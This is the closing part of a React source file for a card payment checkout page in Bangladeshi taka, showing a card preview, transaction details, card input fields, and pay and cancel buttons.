                    <div className="absolute inset-0.5 grid grid-cols-3 gap-[1px] opacity-40">
                      {Array.from({ length: 9 }).map((_, i) => <div key={i} className="bg-yellow-900/40 rounded-[1px]" />)}
                    </div>
                  </div>
                  <svg className="w-5 h-4 text-white/60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5"><path d="M8 8a4 4 0 018 0M4 12a8 8 0 0116 0M2 16a10 10 0 0120 0" /></svg>
                </div>
                <img src={selectedCard.logoImg} alt={selectedCard.label} className={`h-9 object-contain drop-shadow-md ${selectedCard.id === 'visa' ? 'brightness-0 invert' : ''}`} />
              </div>
              <div className="relative">
                <p className="text-white text-[17px] sm:text-[18px] tracking-[3px] font-mono mb-3 drop-shadow-sm" style={{ textShadow: "0 1px 2px rgba(0,0,0,0.35)" }}>{displayCardNumber()}</p>
                <div className="flex justify-between items-end">
                  <div>
                    <p className="text-white/55 text-[9px] uppercase mb-0.5 tracking-[1.5px]">Card Holder</p>
                    <p className="text-white text-[13px] font-semibold tracking-wide uppercase">{cardHolder || "YOUR NAME"}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-white/55 text-[9px] uppercase mb-0.5 tracking-[1.5px]">Expires</p>
                    <p className="text-white text-[13px] font-semibold font-mono">{expiry || "MM/YY"}</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="absolute inset-0 rounded-2xl flex flex-col shadow-xl overflow-hidden" style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)", background: selectedCard.gradientBack }}>
              <div className="w-full h-11 bg-black/55 mt-6" />
              <div className="px-5 mt-5 flex items-center gap-3">
                <div className="flex-1 h-9 bg-white/20 rounded" />
                <div className="bg-white px-3 py-2 rounded text-[13px] font-mono text-gray-800 min-w-[56px] text-center">{cvv || "•".repeat(cvvMaxLength)}</div>
              </div>
            </div>
          </div>
        </div>

        {/* Form sheet */}
        <div className="flex-1 bg-white rounded-t-3xl shadow-[0_-4px_30px_rgba(0,0,0,0.06)] px-5 pt-5 pb-5 transition-all duration-500 flex flex-col" style={{ opacity: cardVisible ? 1 : 0, transform: cardVisible ? "translateY(0)" : "translateY(20px)", transitionDelay: "200ms" }}>
          <div className="space-y-4 flex-1">
            {/* Transaction Details */}
            <div className="rounded-2xl bg-white border border-slate-200/80 shadow-[0_2px_10px_rgba(15,23,42,0.03)] p-4">
              <div className="flex items-center gap-2 mb-3">
                <ShieldCheck className="w-4 h-4 text-blue-600" strokeWidth={2.2} />
                <p className="text-slate-800 text-[13px] font-bold">Transaction Details</p>
              </div>
              <div className="divide-y divide-slate-100">
                <div className="flex items-center justify-between py-2">
                  <span className="text-slate-500 text-[13px]">Amount</span>
                  <span className="text-slate-900 text-[15px] font-bold">৳{amount}</span>
                </div>
                <div className="flex items-center justify-between py-2">
                  <span className="text-slate-500 text-[13px]">Merchant ID</span>
                  <span className="text-slate-800 text-[13px] font-semibold truncate max-w-[55%] text-right">{merchantName}</span>
                </div>
                <div className="flex items-center justify-between py-2">
                  <span className="text-slate-500 text-[13px]">Transaction ID</span>
                  <span className="text-slate-700 text-[12px] font-mono tracking-wider">{(merchantInv && merchantInv.trim()) || transactionId || "—"}</span>
                </div>
              </div>
            </div>

            {/* Card Number */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="text-slate-600 text-[11px] font-semibold uppercase tracking-wide">Card Number</label>
                <button onClick={startCamera} className="flex items-center gap-1 text-slate-400 hover:text-slate-600 text-[11px] font-medium transition-colors">
                  <Camera className="w-3.5 h-3.5" />Scan
                </button>
              </div>
              <div className="relative">
                <input ref={cardNumberRef} type="tel" inputMode="numeric" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="0000 0000 0000 0000"
                  className="w-full border border-slate-200 rounded-xl pl-3.5 pr-14 py-3 text-[15px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-100 focus:border-blue-400 transition-all font-mono" />
                <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center gap-1">
                  {detectedBrand === "visa" && (
                    <div className="px-1.5 py-0.5 bg-[#1a1f71] rounded"><img src={visaLogoImg} alt="Visa" className="h-3.5 object-contain brightness-0 invert" /></div>
                  )}
                  {detectedBrand === "mastercard" && (
                    <img src={mastercardLogoImg} alt="MC" className="h-6 object-contain" />
                  )}
                  {!detectedBrand && cardNumber.length > 0 && (
                    <span className="text-[10px] text-red-500 font-medium">?</span>
                  )}
                </div>
              </div>
              {cardNumber.replace(/\D/g, "").length >= 6 && (
                <div className="mt-2 rounded-lg border border-slate-100 bg-slate-50/80 px-3 py-2 text-[11px] flex items-center flex-wrap gap-x-2 gap-y-0.5">
                  {binLoading && <span className="text-slate-400">Verifying card…</span>}
                  {!binLoading && binInfo && (
                    <>
                      {binInfo.scheme && <span className="font-semibold text-slate-700 uppercase">{binInfo.scheme}</span>}
                      {binInfo.type && <span className="px-1.5 py-0.5 bg-white border border-slate-200 rounded text-slate-600 uppercase tracking-wide text-[10px]">{binInfo.type}</span>}
                      {binInfo.bank && <span className="text-slate-600 truncate max-w-[180px]" title={binInfo.bank}>{binInfo.bank}</span>}
                      {binInfo.country && <span className="text-slate-500 ml-auto">{binInfo.countryEmoji} {binInfo.country}</span>}
                    </>
                  )}
                  {!binLoading && !binInfo && <span className="text-slate-400">Card details unavailable</span>}
                </div>
              )}
            </div>

            {/* Card Holder */}
            <div>
              <label className="text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">Card Holder Name</label>
              <input type="text" value={cardHolder} onChange={handleCardHolderChange} placeholder="John Doe"
                className="w-full border border-slate-200 rounded-xl px-3.5 py-3 text-[15px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-100 focus:border-blue-400 transition-all uppercase" />
            </div>

            {/* Expiry + CVV */}
            <div className="grid grid-cols-[1fr_110px] gap-3">
              <div>
                <label className="text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">Expiration Date</label>
                <div className="grid grid-cols-2 gap-2">
                  <select
                    value={expiry.slice(0, 2)}
                    onChange={(e) => {
                      const mm = e.target.value;
                      const yy = expiry.slice(3, 5);
                      setExpiry(mm && yy ? `${mm}/${yy}` : mm ? `${mm}/` : "");
                    }}
                    className="w-full border border-slate-200 rounded-xl px-2.5 py-3 text-[14px] text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-100 focus:border-blue-400 font-mono bg-white transition-all"
                  >
                    <option value="">MM</option>
                    {Array.from({ length: 12 }).map((_, i) => {
                      const v = (i + 1).toString().padStart(2, "0");
                      return <option key={v} value={v}>{v}</option>;
                    })}
                  </select>
                  <select
                    value={expiry.slice(3, 5)}
                    onChange={(e) => {
                      const yy = e.target.value;
                      const mm = expiry.slice(0, 2);
                      setExpiry(mm && yy ? `${mm}/${yy}` : yy ? `/${yy}` : "");
                    }}
                    className="w-full border border-slate-200 rounded-xl px-2.5 py-3 text-[14px] text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-100 focus:border-blue-400 font-mono bg-white transition-all"
                  >
                    <option value="">YY</option>
                    {Array.from({ length: 12 }).map((_, i) => {
                      const yyyy = new Date().getFullYear() + i;
                      const yy = yyyy.toString().slice(-2);
                      return <option key={yy} value={yy}>{yyyy}</option>;
                    })}
                  </select>
                </div>
              </div>
              <div>
                <label className="text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">CVV</label>
                <input type="password" inputMode="numeric" maxLength={cvvMaxLength} value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, cvvMaxLength))}
                  onFocus={() => setIsFlipped(true)} onBlur={() => setIsFlipped(false)} placeholder={"•".repeat(cvvMaxLength)}
                  className="w-full border border-slate-200 rounded-xl px-3 py-3 text-[15px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-100 focus:border-blue-400 transition-all font-mono text-center tracking-widest" />
              </div>
            </div>
          </div>

          {/* Pay button */}
          <button onClick={handleSubmit} disabled={!isFormValid() || isLoading}
            className={`w-full py-3.5 rounded-xl text-[15px] font-semibold transition-all duration-300 mt-5 whitespace-nowrap shrink-0 flex items-center justify-center gap-2 ${isFormValid() && !isLoading ? "bg-blue-600 hover:bg-blue-700 text-white shadow-lg shadow-blue-500/25 active:scale-[0.98]" : "bg-blue-300/70 text-white cursor-not-allowed"}`}>
            {isLoading ? (
              "Processing..."
            ) : (
              <>
                <Lock className="w-4 h-4" />
                Pay {parseFloat(amount || "0").toFixed(2)} BDT
              </>
            )}
          </button>
          <button
            onClick={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)}
            className="w-full py-3 mt-2.5 rounded-xl text-[14px] font-semibold border border-red-200 text-red-600 bg-white hover:bg-red-50 transition-all flex items-center justify-center gap-2 shrink-0 active:scale-[0.98]"
          >
            <X className="w-4 h-4" />
            Cancel Payment
          </button>

          {/* Footer */}
          <div className="flex items-center justify-between mt-4 shrink-0">
            <div className="flex items-center gap-1.5 text-slate-400 text-[11px]">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
              <span>Protected by PCI DSS</span>
            </div>
            <div className="flex items-center gap-1 text-slate-500 text-[11px] px-2 py-1 rounded-md border border-slate-200 bg-white">
              <Globe className="w-3 h-3" /><span>English</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CardPaymentPage;
